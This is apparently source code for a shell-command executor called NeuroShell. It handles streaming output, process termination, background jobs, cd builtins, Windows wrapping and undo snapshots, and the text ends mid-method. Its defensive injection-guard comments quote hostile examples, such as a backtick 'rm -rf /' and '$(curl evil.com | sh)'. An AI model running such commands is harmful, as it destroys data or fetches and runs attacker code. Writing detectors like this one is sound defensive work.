# Copyright (c) 2024-2026 Abneesh Singh. All rights reserved.
# Proprietary and Confidential - see LICENSE.txt
"""
NeuroShell Shell Executor — Production Grade
Executes commands with real-time streaming, process lifecycle management,
resource monitoring, async support, job tracking, and undo snapshots.
"""

import os
import platform
import re
import shutil
import signal
import subprocess
import threading
import time
import uuid

try:
    import psutil
except ImportError:
    psutil = None
from collections.abc import Callable
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path

# ═══════════════════════════════════════════════════════════
# Data Models
# ═══════════════════════════════════════════════════════════

class ExecutionStatus(Enum):
    """Command execution lifecycle states."""
    PENDING = "pending"
    RUNNING = "running"
    SUCCESS = "success"
    FAILED = "failed"
    TIMEOUT = "timeout"
    CANCELLED = "cancelled"
    BACKGROUND = "background"


@dataclass
class ResourceUsage:
    """Resource consumption metrics for a command."""
    peak_memory_mb: float = 0.0
    cpu_percent: float = 0.0
    io_read_bytes: int = 0
    io_write_bytes: int = 0
    thread_count: int = 1

    @property
    def summary(self) -> str:
        parts = []
        if self.peak_memory_mb > 0:
            parts.append(f"mem={self.peak_memory_mb:.1f}MB")
        if self.cpu_percent > 0:
            parts.append(f"cpu={self.cpu_percent:.0f}%")
        if self.io_read_bytes > 0:
            parts.append(f"read={self._human_size(self.io_read_bytes)}")
        if self.io_write_bytes > 0:
            parts.append(f"write={self._human_size(self.io_write_bytes)}")
        return " | ".join(parts) if parts else "minimal"

    @staticmethod
    def _human_size(nbytes: int) -> str:
        for unit in ("B", "KB", "MB", "GB"):
            if nbytes < 1024:
                return f"{nbytes:.1f}{unit}"
            nbytes /= 1024
        return f"{nbytes:.1f}TB"


@dataclass
class ExecutionResult:
    """Comprehensive result of a command execution."""
    command: str
    exit_code: int
    stdout: str
    stderr: str
    duration_ms: float
    shell: str
    cwd: str
    status: ExecutionStatus = ExecutionStatus.SUCCESS
    timestamp: float = field(default_factory=time.time)
    was_timeout: bool = False
    was_cancelled: bool = False
    pid: int = 0
    resources: ResourceUsage = field(default_factory=ResourceUsage)
    env_snapshot: dict = field(default_factory=dict)

    @property
    def success(self) -> bool:
        return self.exit_code == 0 and self.status == ExecutionStatus.SUCCESS

    @property
    def has_error(self) -> bool:
        return self.exit_code != 0 or bool(self.stderr.strip())

    @property
    def output_preview(self) -> str:
        """First 200 chars of stdout for quick display."""
        text = self.stdout.strip()
        return text[:200] + "..." if len(text) > 200 else text

    @property
    def error_preview(self) -> str:
        """Last 500 chars of stderr for error display."""
        text = self.stderr.strip()
        return text[-500:] if len(text) > 500 else text


@dataclass
class StateSnapshot:
    """File state snapshot for undo support."""
    snapshot_id: str
    command: str
    timestamp: float
    files: dict          # path -> content bytes
    directories_created: list
    cwd: str
    description: str = ""

    @property
    def file_count(self) -> int:
        return len(self.files)

    @property
    def total_bytes(self) -> int:
        return sum(len(v) for v in self.files.values())


@dataclass
class BackgroundJob:
    """A background process being tracked."""
    job_id: str
    command: str
    process: subprocess.Popen
    start_time: float
    output_lines: list = field(default_factory=list)
    error_lines: list = field(default_factory=list)

    @property
    def is_running(self) -> bool:
        return self.process.poll() is None

    @property
    def elapsed_s(self) -> float:
        return round(time.time() - self.start_time, 1)

    @property
    def pid(self) -> int:
        return self.process.pid

    def to_dict(self) -> dict:
        return {
            "job_id": self.job_id,
            "command": self.command,
            "pid": self.pid,
            "running": self.is_running,
            "elapsed_s": self.elapsed_s,
            "exit_code": self.process.returncode,
        }


# ═══════════════════════════════════════════════════════════
# Shell Executor — Production Engine
# ═══════════════════════════════════════════════════════════

class ShellExecutor:
    """
    Production-grade shell command executor.

    Features:
    - Real-time streaming output with callbacks
    - Configurable timeouts with graceful process termination
    - Ctrl+C signal forwarding and cancellation
    - Resource monitoring (CPU, memory, I/O)
    - Background job tracking
    - File state snapshots for undo
    - Multi-shell support (PowerShell, CMD, Bash, Zsh)
    - cd/pushd/popd directory management
    - Environment variable isolation
    """

    MAX_OUTPUT_BUFFER = 10 * 1024 * 1024   # 10 MB max output capture
    MAX_SNAPSHOT_FILE = 10 * 1024 * 1024    # 10 MB max per-file snapshot
    GRACEFUL_KILL_TIMEOUT = 3               # seconds before SIGKILL

    def __init__(self, config):
        self.config = config
        self._cwd = os.getcwd()
        self._prev_cwd = self._cwd
        self._env = os.environ.copy()
        self._custom_env: dict[str, str] = {}
        self._snapshots: list[StateSnapshot] = []
        self._max_snapshots = getattr(config, "undo_snapshots", 20)
        self._system = platform.system()
        self._dir_stack: list[str] = []

        # Background jobs
        self._bg_jobs: dict[str, BackgroundJob] = {}
        self._job_counter = 0

        # Execution tracking
        self._active_process: subprocess.Popen | None = None
        self._cancelled = False
        self._total_commands = 0
        self._total_duration_ms = 0.0

        # Temp files created by multi-line script wrapping, to clean post-exec
        self._pending_temp_files: list[str] = []

    # ── Properties ────────────────────────────────────────

    @property
    def cwd(self) -> str:
        return self._cwd

    @property
    def stats(self) -> dict:
        return {
            "total_commands": self._total_commands,
            "avg_duration_ms": round(
                self._total_duration_ms / max(1, self._total_commands), 1
            ),
            "active_bg_jobs": sum(1 for j in self._bg_jobs.values() if j.is_running),
            "snapshots": len(self._snapshots),
            "cwd": self._cwd,
        }

    # ── Main Execution ────────────────────────────────────

    def execute(
        self,
        command: str,
        shell: str | None = None,
        timeout: int = 300,
        stream_callback: Callable[[str], None] | None = None,
        capture_snapshot: bool = False,
        snapshot_paths: list[str] | None = None,
        env_overrides: dict[str, str] | None = None,
        stdin_data: str | None = None,
    ) -> ExecutionResult:
        """
        Execute a command with full lifecycle management.

        Args:
            command:          Shell command string to execute
            shell:            Override shell (powershell/cmd/bash/zsh)
            timeout:          Max seconds before timeout (-1 for no limit)
            stream_callback:  Called with each output line in real-time
            capture_snapshot:  Snapshot files before execution for undo
            snapshot_paths:   Files/dirs to snapshot
            env_overrides:    Extra environment variables for this command
            stdin_data:       Data to pipe to stdin
        """
        shell = shell or getattr(self.config, "default_shell", self._detect_default_shell())
        start_time = time.time()
        self._cancelled = False
        self._total_commands += 1

        # ─── Background job detection ───
        if command.rstrip().endswith("&") and not command.rstrip().endswith("&&"):
            return self._launch_background(command.rstrip()[:-1].strip(), shell)

        # ─── Directory change handling ───
        builtin_result = self._handle_builtin(command, start_time, shell)
        if builtin_result is not None:
            return builtin_result

        # ─── Smart command pre-processing (auto-wrapping) ───
        command = self._preprocess_command(command, shell)

        # ─── Secondary injection guard (defense-in-depth) ───
        injection_error = self._check_injection(command)
        if injection_error:
            return self._make_error_result(command, 1, injection_error, start_time, shell)

        # ─── Pre-execution snapshot ───
        if capture_snapshot and snapshot_paths:
            self._take_snapshot(command, snapshot_paths)

        # ─── Build shell command ───
        shell_cmd, shell_executable = self._build_shell_command(command, shell)

        # ─── Build environment ───
        exec_env = self._build_env(env_overrides)

        # ─── Execute ───
        try:
            process = subprocess.Popen(
                shell_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE if stdin_data else None,
                cwd=self._cwd,
                env=exec_env,
                shell=False,
                text=True,
                bufsize=1,
                creationflags=(subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.CREATE_NO_WINDOW) if self._system == "Windows" else 0,
                start_new_session=(self._system != "Windows"),
            )
            self._active_process = process

            # Resource monitoring thread
            resources = ResourceUsage()
            monitor_thread = threading.Thread(
                target=self._monitor_resources,
                args=(process.pid, resources),
                daemon=True,
            )
            monitor_thread.start()

            # Execute with streaming or batch
            result = self._execute_with_streaming(
                process, command, shell, start_time, timeout,
                stream_callback, stdin_data, resources,
            )
            self._active_process = None
            self._total_duration_ms += result.duration_ms
            return result

        except FileNotFoundError:
            self._active_process = None
            return self._make_error_result(
                command, 127, f"Shell not found: {shell}", start_time, shell
            )
        except PermissionError:
            self._active_process = None
            return self._make_error_result(
                command, 126, f"Permission denied: {command}", start_time, shell
            )
        except Exception as e:
            self._active_process = None
            return self._make_error_result(
                command, 1, str(e), start_time, shell
            )
        finally:
            self._cleanup_pending_temp_files()

    def _execute_with_streaming(
        self,
        process: subprocess.Popen,
        command: str,
        shell: str,
        start_time: float,
        timeout: int,
        stream_callback: Callable | None,
        stdin_data: str | None,
        resources: ResourceUsage,
    ) -> ExecutionResult:
        """Handle streaming output and process completion."""
        stdout_lines = []
        stderr_lines = []
        total_bytes = 0

        # Send stdin data if provided
        if stdin_data and process.stdin:
            try:
                process.stdin.write(stdin_data)
                process.stdin.close()
            except (BrokenPipeError, OSError):
                pass

        # Real-time streaming mode
        if stream_callback and process.stdout:
            stderr_chunks = []
            def _drain_stderr():
                if process.stderr:
                    try:
                        for err_line in process.stderr:
                            stderr_chunks.append(err_line)
                    except Exception:
                        pass

            err_thread = threading.Thread(target=_drain_stderr, daemon=True)
            err_thread.start()

            try:
                for line in process.stdout:
                    if self._cancelled:
                        self._terminate_process(process)
                        err_thread.join(timeout=0.5)
                        return self._make_cancelled_result(command, start_time, shell)

                    total_bytes += len(line)
                    if total_bytes <= self.MAX_OUTPUT_BUFFER:
                        stdout_lines.append(line)
                    stream_callback(line.rstrip("\n"))

                effective_timeout = timeout if timeout > 0 else None
                process.wait(timeout=effective_timeout)
                err_thread.join(timeout=1.0)
                stderr_lines = stderr_chunks

            except subprocess.TimeoutExpired:
                self._terminate_process(process)
                err_thread.join(timeout=0.5)
                return self._make_timeout_result(command, timeout, start_time, shell)

        else:
            # Batch mode
            try:
                effective_timeout = timeout if timeout > 0 else None
                stdout, stderr = process.communicate(timeout=effective_timeout)
                stdout_lines = [stdout]
                stderr_lines = [stderr]
            except subprocess.TimeoutExpired:
                self._terminate_process(process)
                return self._make_timeout_result(command, timeout, start_time, shell)

        duration = (time.time() - start_time) * 1000
        status = ExecutionStatus.SUCCESS if process.returncode == 0 else ExecutionStatus.FAILED

        return ExecutionResult(
            command=command,
            exit_code=process.returncode or 0,
            stdout="".join(stdout_lines),
            stderr="".join(stderr_lines),
            duration_ms=round(duration, 1),
            shell=shell,
            cwd=self._cwd,
            status=status,
            pid=process.pid,
            resources=resources,
        )

    # ── Process Lifecycle ──────────────────────────────────

    def cancel(self):
        """Cancel the currently running command."""
        self._cancelled = True
        if self._active_process and self._active_process.poll() is None:
            self._terminate_process(self._active_process)

    def _terminate_process(self, process: subprocess.Popen):
        """Gracefully terminate a process with escalation to SIGKILL."""
        try:
            if psutil and process.pid:
                try:
                    parent = psutil.Process(process.pid)
                    children = parent.children(recursive=True)
                    for child in children:
                        try:
                            child.terminate()
                        except (psutil.NoSuchProcess, psutil.AccessDenied):
                            pass
                    parent.terminate()
                    gone, alive = psutil.wait_procs(children + [parent], timeout=self.GRACEFUL_KILL_TIMEOUT)
                    for p in alive:
                        try:
                            p.kill()
                        except (psutil.NoSuchProcess, psutil.AccessDenied):
                            pass
                    return
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass

            if self._system == "Windows":
                process.terminate()
            else:
                try:
                    pgid = os.getpgid(process.pid)
                    os.killpg(pgid, signal.SIGTERM)
                except (ProcessLookupError, OSError):
                    process.send_signal(signal.SIGTERM)

            try:
                process.wait(timeout=self.GRACEFUL_KILL_TIMEOUT)
            except subprocess.TimeoutExpired:
                if self._system != "Windows":
                    try:
                        pgid = os.getpgid(process.pid)
                        os.killpg(pgid, signal.SIGKILL)
                    except (ProcessLookupError, OSError):
                        process.kill()
                else:
                    process.kill()
                process.wait(timeout=2)
        except (ProcessLookupError, OSError):
            pass

    # ── Resource Monitoring ────────────────────────────────

    def _monitor_resources(self, pid: int, resources: ResourceUsage):
        """Monitor resource usage of a process in a background thread."""
        try:
            proc = psutil.Process(pid)
            while proc.is_running() and proc.status() != psutil.STATUS_ZOMBIE:
                try:
                    mem_info = proc.memory_info()
                    resources.peak_memory_mb = max(
                        resources.peak_memory_mb,
                        mem_info.rss / (1024 * 1024),
                    )
                    resources.cpu_percent = proc.cpu_percent(interval=0.1)
                    try:
                        io = proc.io_counters()
                        resources.io_read_bytes = io.read_bytes
                        resources.io_write_bytes = io.write_bytes
                    except (psutil.AccessDenied, AttributeError):
                        pass
                    resources.thread_count = proc.num_threads()
                except (psutil.NoSuchProcess, psutil.ZombieProcess):
                    break
                time.sleep(0.5)
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass

    # ── Background Jobs ────────────────────────────────────

    def _launch_background(self, command: str, shell: str) -> ExecutionResult:
        """Launch a command in the background."""
        # Reap any finished jobs so file descriptors are not retained
        # by long-running daemons that never call list_jobs().
        self._cleanup_finished_jobs()

        max_jobs = getattr(getattr(self.config, "executor", None), "max_background_jobs", 10)
        active_jobs = sum(1 for j in self._bg_jobs.values() if j.process.poll() is None)
        if active_jobs >= max_jobs:
            return ExecutionResult(
                command=command,
                exit_code=1,
                stderr=f"Background job limit reached ({active_jobs}/{max_jobs}). Stop existing jobs first.",
                duration_ms=0,
            )

        shell_cmd, shell_executable = self._build_shell_command(command, shell)
        start_time = time.time()

        try:
            process = subprocess.Popen(
                shell_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                cwd=self._cwd,
                env=self._build_env(),
                shell=False,
                text=True,
                creationflags=(subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.CREATE_NO_WINDOW) if self._system == "Windows" else 0,
                start_new_session=(self._system != "Windows"),
            )

            self._job_counter += 1
            job_id = f"bg_{self._job_counter}"
            job = BackgroundJob(
                job_id=job_id,
                command=command,
                process=process,
                start_time=start_time,
            )
            self._bg_jobs[job_id] = job

            # Collect output with bounded 10,000-line rolling buffer to prevent memory leaks
            def _drain(stream, buf):
                if stream is None:
                    return
                try:
                    for line in stream:
                        buf.append(line)
                        if len(buf) > 10000:
                            del buf[:1000]
                except (ValueError, OSError):
                    pass  # stream closed

            threading.Thread(target=_drain, args=(job.process.stdout, job.output_lines), daemon=True).start()
            threading.Thread(target=_drain, args=(job.process.stderr, job.error_lines), daemon=True).start()

            return ExecutionResult(
                command=command,
                exit_code=0,
                stdout=f"[{job_id}] PID {process.pid} started in background",
                stderr="",
                duration_ms=0,
                shell=shell,
                cwd=self._cwd,
                status=ExecutionStatus.BACKGROUND,
                pid=process.pid,
            )
        except Exception as e:
            return self._make_error_result(command, 1, str(e), start_time, shell)

    def list_jobs(self) -> list[dict]:
        """List all background jobs."""
        self._cleanup_finished_jobs()
        return [job.to_dict() for job in self._bg_jobs.values()]

    def kill_job(self, job_id: str) -> bool:
        """Kill a background job."""
        job = self._bg_jobs.get(job_id)
        if job and job.is_running:
            self._terminate_process(job.process)
            return True
        return False

    def get_job_output(self, job_id: str) -> str | None:
        """Get output from a background job."""
        job = self._bg_jobs.get(job_id)
        if job:
            return "".join(job.output_lines)
        return None

    # Finished jobs are kept this long so the user can still read their output
    _JOB_RETAIN_S = 300

    def _cleanup_finished_jobs(self):
        """Remove finished jobs from tracking and release their pipe FDs."""
        now = time.time()
        to_remove = []
        for jid, job in self._bg_jobs.items():
            if not job.is_running and (now - job.start_time) > self._JOB_RETAIN_S:
                to_remove.append(jid)
        for jid in to_remove:
            job = self._bg_jobs.pop(jid, None)
            if job is None:
                continue
            # Close pipes so we don't leak file descriptors
            for stream in (job.process.stdout, job.process.stderr, job.process.stdin):
                try:
                    if stream is not None:
                        stream.close()
                except (OSError, ValueError):
                    pass

    # ── Builtins & Directory Management ────────────────────

    def _handle_builtin(self, command: str, start_time: float, shell: str) -> ExecutionResult | None:
        """Handle shell builtins: cd, pushd, popd, export/set."""
        cmd_stripped = command.strip()
        cmd_lower = cmd_stripped.lower()

        # ─── cd / Set-Location ───
        target = None
        if cmd_lower.startswith("cd "):
            target = cmd_stripped[3:].strip().strip('"').strip("'")
        elif cmd_lower.startswith("set-location "):
            target = cmd_stripped[13:].strip().strip('"').strip("'")
        elif cmd_lower == "cd":
            target = str(Path.home())
        elif cmd_lower == "cd -":
            target = self._prev_cwd

        if target is not None:
            return self._handle_cd(command, target, start_time, shell)

        # ─── pushd ───
        if cmd_lower.startswith("pushd"):
            target = cmd_stripped[5:].strip().strip('"').strip("'") if len(cmd_stripped) > 5 else self._cwd
            self._dir_stack.append(self._cwd)
            return self._handle_cd(command, target, start_time, shell)

        # ─── popd ───
        if cmd_lower == "popd":
            if self._dir_stack:
                target = self._dir_stack.pop()
                return self._handle_cd(command, target, start_time, shell)
            return self._make_error_result(command, 1, "Directory stack is empty", start_time, shell)

        # ─── export / set env ───
        if cmd_lower.startswith("export ") or (self._system == "Windows" and cmd_lower.startswith("set ")):
            return self._handle_env_set(command, start_time, shell)

        return None

    def _handle_cd(self, command: str, target: str, start_time: float, shell: str) -> ExecutionResult:
        """Handle directory change with ~ expansion and validation."""
        try:
            # Expand ~ and environment variables
            target = os.path.expanduser(target)
            target = os.path.expandvars(target)

            new_path = (Path(self._cwd) / target).resolve()

            if new_path.is_dir():
                self._prev_cwd = self._cwd
                self._cwd = str(new_path)
                # NOTE: Do not call os.chdir here — subprocesses inherit cwd via
                # Popen(cwd=self._cwd). Mutating the process-global cwd races
                # with concurrent execute() calls and breaks job tracking.
                duration = (time.time() - start_time) * 1000
                return ExecutionResult(
                    command=command, exit_code=0,
                    stdout=str(new_path), stderr="",
                    duration_ms=round(duration, 1), shell=shell, cwd=self._cwd,
                    status=ExecutionStatus.SUCCESS,
                )
            else:
                suggestion = ""
                parent = new_path.parent
                if parent.is_dir():
                    matches = [d.name for d in parent.iterdir() if d.is_dir() and d.name.lower().startswith(new_path.name[:3].lower())]
                    if matches:
                        suggestion = f"\nDid you mean: {', '.join(matches[:3])}?"
                return self._make_error_result(
                    command, 1, f"Directory not found: {new_path}{suggestion}", start_time, shell
                )
        except Exception as e:
            return self._make_error_result(command, 1, str(e), start_time, shell)

    def _handle_env_set(self, command: str, start_time: float, shell: str) -> ExecutionResult:
        """Handle export VAR=value or set VAR=value."""
        try:
            if command.strip().lower().startswith("export "):
                assignment = command.strip()[7:]
            else:
                assignment = command.strip()[4:]

            if "=" in assignment:
                key, value = assignment.split("=", 1)
                key = key.strip()
                value = value.strip().strip('"').strip("'")
                self._env[key] = value
                self._custom_env[key] = value
                return ExecutionResult(
                    command=command, exit_code=0,
                    stdout=f"{key}={value}", stderr="",
                    duration_ms=round((time.time() - start_time) * 1000, 1),
                    shell=shell, cwd=self._cwd, status=ExecutionStatus.SUCCESS,
                )
            else:
                return self._make_error_result(command, 1, "Invalid syntax. Use: export VAR=value", start_time, shell)
        except Exception as e:
            return self._make_error_result(command, 1, str(e), start_time, shell)

    # ── Smart Command Pre-processing ─────────────────────────

    # CMD built-in commands that don't exist as .exe files
    _CMD_BUILTINS = frozenset({
        "start", "for", "set", "type", "copy", "del", "ren", "rename",
        "mklink", "assoc", "ftype", "echo", "title", "cls", "color",
        "ver", "vol", "path", "prompt", "pause", "call", "if", "goto",
        "shift", "setlocal", "endlocal", "rem", "md", "rd", "rmdir",
        "move", "xcopy", "attrib", "more", "sort", "fc", "comp",
        "replace", "tree", "where", "choice", "timeout",
    })

    # PowerShell cmdlet prefixes (Verb-Noun pattern)
    _PS_VERB_PREFIXES = frozenset({
        "get-", "set-", "new-", "remove-", "add-", "clear-", "copy-",
        "move-", "rename-", "test-", "start-", "stop-", "restart-",
        "invoke-", "import-", "export-", "select-", "sort-", "group-",
        "measure-", "compare-", "format-", "out-", "write-", "read-",
        "update-", "enable-", "disable-", "register-", "unregister-",
        "convert-", "convertfrom-", "convertto-", "foreach-", "where-",
        "wait-", "debug-", "trace-", "enter-", "exit-", "push-", "pop-",
        "show-", "hide-", "protect-", "unprotect-", "block-", "unblock-",
        "mount-", "dismount-", "find-", "search-", "resolve-", "split-",
        "join-", "merge-", "expand-", "compress-", "receive-", "send-",
        "connect-", "disconnect-", "open-", "close-", "lock-", "unlock-",
    })

    # Standalone PS cmdlets (no Verb-Noun, but still PS-only)
    _PS_STANDALONE = frozenset({
        "select-string", "where-object", "foreach-object",
        "sort-object", "group-object", "measure-object",
        "format-table", "format-list", "format-wide",
        "out-string", "out-file", "out-null", "out-gridview",
        "write-host", "write-output", "write-error", "write-warning",
        "write-verbose", "write-debug", "write-information",
        "read-host", "clear-host", "get-command", "get-help",
        "get-member", "get-process", "get-service", "get-childitem",
        "get-content", "get-item", "get-itemproperty", "get-location",
        "get-date", "get-random", "get-eventlog", "get-wmiobject",
        "get-ciminstance", "get-netadapter", "get-netipaddress",
        "get-volume", "get-disk", "get-partition", "get-clipboard",
        "set-clipboard", "set-content", "set-item", "set-location",
        "new-item", "remove-item", "copy-item", "move-item",
        "test-path", "test-connection", "test-netconnection",
        "invoke-webrequest", "invoke-restmethod",
        "start-process", "stop-process", "start-service", "stop-service",
        "clear-recycleBin",
    })

    # Interactive programs that need special handling
    _INTERACTIVE_PROGRAMS = frozenset({
        "python", "python3", "node", "irb", "ruby", "lua",
        "nslookup", "ftp", "telnet", "ssh", "mysql", "psql",
        "mongo", "mongosh", "sqlite3", "redis-cli",
    })

    # ── Injection Guard ────────────────────────────────────

    # Patterns that indicate shell injection attempts.
    # These are last-line-of-defense: the safety layer runs first.
    # Matches are only flagged when they look like *injected* sub-commands,
    # not when the user explicitly typed a semicolon-separated command.
    _INJECTION_PATTERNS = [
        # Null byte injection (common in HTTP-sourced payloads)
        (re.compile(r"\x00"), "null byte detected in command"),
        # Newline smuggling — injects a second command on a new line
        (re.compile(r"\r|(?<!\\)\n"), "newline injection detected"),
        # Backtick subshell execution: `rm -rf /`
        (re.compile(r"`[^`]{1,200}`"), "backtick subshell injection detected"),
        # $(...) subshell: $(curl evil.com | sh)
        (re.compile(r"\$\([^)]{1,200}\)"), "$(...) subshell injection detected"),
    ]

    def _check_injection(self, command: str) -> str | None:
        """Secondary injection guard — defense-in-depth last-line check.

        Scans for patterns that strongly indicate shell injection, not legitimate
        shell usage. Returns an error message if injection is detected, else None.

        Config knobs (on `self.config`):
          - injection_guard_enabled (default True) — global on/off
          - allow_command_substitution (default False) — when True, $() and
            backtick patterns are not flagged (null byte and newline checks
            still run; those are never legitimate in single-line commands).
        """
        # Use explicit `is False` / `is True` so MagicMock-based tests (which
        # return truthy MagicMock objects for any unset attribute) still see
        # the intended defaults.
        if getattr(self.config, "injection_guard_enabled", True) is False:
            return None

        allow_subst = getattr(self.config, "allow_command_substitution", False) is True
        _exec_log = __import__('logging').getLogger('neuroshell.executor')

        for pattern, description in self._INJECTION_PATTERNS:
            # When command substitution is explicitly allowed, skip subshell patterns
            if allow_subst and ("subshell" in description):
                continue
            if pattern.search(command):
                _exec_log.warning("Injection guard triggered: %s | cmd=%r", description, command[:80])
                return f"Security: {description} — command blocked"
        return None

    def _preprocess_command(self, command: str, shell: str) -> str:  # type: ignore[return]
        """
        Smart command pre-processing:
        1. Auto-wrap CMD builtins with `cmd /c` when needed
        2. Auto-wrap PowerShell cmdlets with `powershell -Command`
        3. Detect interactive programs and add non-interactive flags
        4. Handle multi-line scripts via temp files
        """
        if self._system != "Windows":
            return command

        stripped = command.strip()
        if not stripped:
            return command

        # ── Multi-line script handling ──
        if "\n" in stripped:
            return self._handle_multiline(stripped, shell)

        # Already wrapped — don't double-wrap
        lower = stripped.lower()
        if lower.startswith("cmd /c ") or lower.startswith("powershell ") or lower.startswith("pwsh "):
            return command

        first_token = lower.split()[0] if lower.split() else ""

        # ── CMD built-in wrapping ──
        if first_token in self._CMD_BUILTINS:
            # If running in PowerShell, wrap with cmd /c
            if shell in ("powershell", "pwsh"):
                return f"cmd /c {stripped}"
            return command

        # ── PowerShell cmdlet wrapping ──
        is_ps_cmdlet = (
            first_token in self._PS_STANDALONE
            or any(first_token.startswith(prefix) for prefix in self._PS_VERB_PREFIXES)
        )
        if is_ps_cmdlet:
            # If running in CMD, wrap with powershell -Command
            if shell == "cmd":
                escaped = stripped.replace('"', '\\"')
                return f'powershell -NoProfile -Command "{escaped}"'
            return command

        # ── Pipe to PS cmdlets (e.g., "netstat | Select-String 80") ──
        if "|" in stripped:
            parts = stripped.split("|")
            for part in parts[1:]:  # Check commands after the pipe
                pipe_cmd = part.strip().lower().split()[0] if part.strip() else ""
                is_pipe_ps = (
                    pipe_cmd in self._PS_STANDALONE
                    or any(pipe_cmd.startswith(p) for p in self._PS_VERB_PREFIXES)
                )
                if is_pipe_ps and shell == "cmd":
                    escaped = stripped.replace('"', '\\"')
                    return f'powershell -NoProfile -Command "{escaped}"'

        # ── Interactive program detection ──
        if first_token in self._INTERACTIVE_PROGRAMS:
            # If launched without args or script, it's interactive
            tokens = stripped.split()
            if len(tokens) == 1:
                # Bare interpreter — add version/help flag
                if first_token in ("python", "python3") or first_token == "node":
                    return f"{stripped} --version"
                elif first_token == "nslookup":
                    return command  # nslookup with no args is fine with timeout

        return command

    def _handle_multiline(self, script: str, shell: str) -> str:
        """Save multi-line script to temp file and execute it.

        The temp file is tracked on the instance and deleted by
        `_cleanup_pending_temp_files()` after the command completes.
        Using delete=False is required because the spawned shell needs
        to open the file by path; we own the cleanup explicitly.
        """
        import tempfile

        temp_dir = os.environ.get("TEMP") or tempfile.gettempdir()

        if shell in ("powershell", "pwsh"):
            with tempfile.NamedTemporaryFile(
                mode="w", suffix=".ps1", delete=False, dir=temp_dir
            ) as f:
                f.write(script)
                temp_path = f.name
            self._pending_temp_files.append(temp_path)
            ps_exe = shutil.which("pwsh") or shutil.which("powershell") or "powershell"
            return f'{ps_exe} -NoProfile -ExecutionPolicy Bypass -File "{temp_path}"'
        else:
            with tempfile.NamedTemporaryFile(
                mode="w", suffix=".bat", delete=False, dir=temp_dir
            ) as f:
                f.write("@echo off\n" + script)
                temp_path = f.name
            self._pending_temp_files.append(temp_path)
            return f'cmd /c "{temp_path}"'

    def _cleanup_pending_temp_files(self):
        """Delete temp files created by _handle_multiline. Called after execute()."""
        if not self._pending_temp_files:
            return
        for path in self._pending_temp_files:
            try:
                os.unlink(path)
            except OSError:
                pass  # best-effort; file may be locked on Windows
        self._pending_temp_files.clear()

    # ── Shell Command Building ─────────────────────────────

    def _build_shell_command(self, command: str, shell: str) -> tuple:
        """Build platform-specific shell command."""
        if self._system == "Windows":
            lower = command.strip().lower()
            # If the command already explicitly invokes a shell, execute it as a raw string
            # to prevent subprocess.Popen quote mangling and double-evaluation.
            if lower.startswith("powershell ") or lower.startswith("pwsh ") or lower.startswith("cmd "):
                return (command, None)

            if shell == "powershell" or shell == "pwsh":
                ps_exe = shutil.which("pwsh") or shutil.which("powershell") or "powershell"
                return ([ps_exe, "-NoProfile", "-NonInteractive", "-Command", command], None)
            elif shell == "cmd":
                return (["cmd", "/c", command], None)
            elif shell == "bash":
                bash_exe = shutil.which("bash")
                if bash_exe:
                    return ([bash_exe, "-c", command], None)
                return (["cmd", "/c", command], None)
        else:
            shell_path = shutil.which(shell) or f"/usr/bin/{shell}"
            if os.path.exists(shell_path):
                return ([shell_path, "-c", command], None)
            return (["/bin/sh", "-c", command], None)

        return ([command], None)

    def _build_env(self, overrides: dict | None = None) -> dict:
        """Build execution environment with custom vars and overrides."""
        env = self._env.copy()
        env.update(self._custom_env)
        if overrides:
            env.update(overrides)
        return env

    def _detect_default_shell(self) -> str:
        """Auto-detect the best available shell."""
        if self._system == "Windows":
            if shutil.which("pwsh"):
                return "pwsh"
            return "powershell"
        else:
            shell = os.environ.get("SHELL", "/bin/bash")
            return os.path.basename(shell)

    # ── Snapshot / Undo ────────────────────────────────────

    def _take_snapshot(self, command: str, paths: list[str]) -> StateSnapshot:
        """Take file state snapshot before destructive command."""
        files = {}
        dirs_created = []

        for path_str in paths:
            p = Path(path_str)
            try:
                if p.is_file() and p.stat().st_size < self.MAX_SNAPSHOT_FILE:
                    files[str(p.resolve())] = p.read_bytes()
                elif p.is_dir():
                    for child in p.rglob("*"):
                        if child.is_file() and child.stat().st_size < self.MAX_SNAPSHOT_FILE:
                            total_size = sum(len(v) for v in files.values())
                            if total_size < 50 * 1024 * 1024:  # 50MB total cap
                                files[str(child.resolve())] = child.read_bytes()
            except (PermissionError, OSError):
                pass

        snapshot = StateSnapshot(
            snapshot_id=str(uuid.uuid4())[:8],
            command=command,
            timestamp=time.time(),
            files=files,
            directories_created=dirs_created,
            cwd=self._cwd,
            description=f"Before: {command[:80]}",
        )

        self._snapshots.append(snapshot)
        while len(self._snapshots) > self._max_snapshots:
            self._snapshots.pop(0)

        return snapshot

    def undo_last(self) -> tuple[str, list[str]] | None:
        """Undo the last snapshotted command. Returns (command, restored_files)."""
        if not self._snapshots:
            return None

        snapshot = self._snapshots.pop()
        restored = []

        for path_str, content in snapshot.files.items():
            try:
                Path(path_str).parent.mkdir(parents=True, exist_ok=True)
                Path(path_str).write_bytes(content)
                restored.append(path_str)
            except (PermissionError, OSError):
                pass

        return (snapshot.command, restored)

    def get_snapshots(self) -> list[dict]:
        """Get list of available undo snapshots with metadata."""
        return [
            {
                "id": s.snapshot_id,
                "command": s.command,
                "files": s.file_count,
                "size_bytes": s.total_bytes,
                "age_s": round(time.time() - s.timestamp),
                "description": s.description,
            }
            for s in reversed(self._snapshots)
        ]

    # ── Helper Methods ─────────────────────────────────────

    def _make_error_result(self, command: str, code: int, error: str, start_time: float, shell: str) -> ExecutionResult:
        """Create an error ExecutionResult."""
        return ExecutionResult(
            command=command, exit_code=code, stdout="", stderr=error,
            duration_ms=round((time.time() - start_time) * 1000, 1),
            shell=shell, cwd=self._cwd, status=ExecutionStatus.FAILED,
        )

    def _make_timeout_result(self, command: str, timeout: int, start_time: float, shell: str) -> ExecutionResult:
        """Create a timeout ExecutionResult."""
        return ExecutionResult(
            command=command, exit_code=-1, stdout="",
            stderr=f"Command timed out after {timeout}s — process terminated",
            duration_ms=round((time.time() - start_time) * 1000, 1),
            shell=shell, cwd=self._cwd,
            status=ExecutionStatus.TIMEOUT, was_timeout=True,
        )

    def _make_cancelled_result(self, command: str, start_time: float, shell: str) -> ExecutionResult:
